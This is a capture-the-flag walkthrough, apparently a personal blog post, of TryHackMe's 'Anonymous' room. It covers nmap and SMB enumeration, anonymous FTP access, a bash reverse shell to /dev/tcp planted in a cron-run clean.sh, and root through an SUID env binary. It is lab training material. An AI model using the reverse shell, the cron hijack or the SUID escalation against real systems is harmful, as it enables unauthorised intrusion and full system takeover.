# **Description**

Hello l33ts, I hope you are doing well. We are doing [Anonymous](https://tryhackme.com/room/anonymous) from [TryHackMe](https://tryhackme.com)

# **Enumeration**
## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```Terminal
Nmap scan report for 10.10.50.126

There are 4 open ports:
 - 21 ftp vsftpd
 - 22 ssh OpenSSH 7.6p1
 - 139 netbios-ssn Samba smbd
 - 445 netbios-ssn Samba smbd

Let's start off by enumerating ftp since it allows anonymous login.

## FTP

We can connect to the ftp server with `ftp {target_IP}`, we supply the name as `anonymous` and we can left the password blank.

![](/assets/img/tryhackme/anonymous/a1.png)

We found some files on the server, we can download them to our machine using `get {filename}`.

Now that the files are downloaded, let's see what's on them.

![](/assets/img/tryhackme/anonymous/a3.png)

First, we have `clean.sh` script that seems to be a cleaning script. The `to_do.txt` file has a note for removing the anonymous login. The third file, `removed_file.log`, has a bunch of text that's beings repeated, and it is the same text we saw in the `clean.sh` script ,so there must be a cronjob that runs `clean.sh` regularly.

## SMB

We can check the shares of the smb server by running : `sudo smbclient -L {target_IP} -N`.

We found `pics` share, we can connect to that share with this command : `sudo smbclient //{target_IP}/pics -N`

There are two pictures there, i downloaded them using `get {filename}`, inspected them for hidden content but i got nothing.


# **Foothold**

We can use the `clean.sh` script to get access to the machine, let's check it's permissions first.

![](/assets/img/tryhackme/anonymous/a4.png)

We see that can edit the script. What i did is i created a file with the same name 'clean.sh' and put the following script in that file.

```bash
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.11.x.x/9001 0>&1
```

This script sends a reverse shell, so i setup a listener on my machine with `nc -lvnp 9001`, and uploaded a script to the ftp server using `put clean.sh`.

Waiting for some time, i got the shell.

# **Privilege Escalation**

For privesc, I uploaded linpeas and ran it.

![](/assets/img/tryhackme/anonymous/a7.png)

We found that `env` has suid binary set, searching for the binary in [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid) we found that we can run `env /bin/bash -p` and get a root shell

![](/assets/img/tryhackme/anonymous/a8.png)

Great! We got root access.
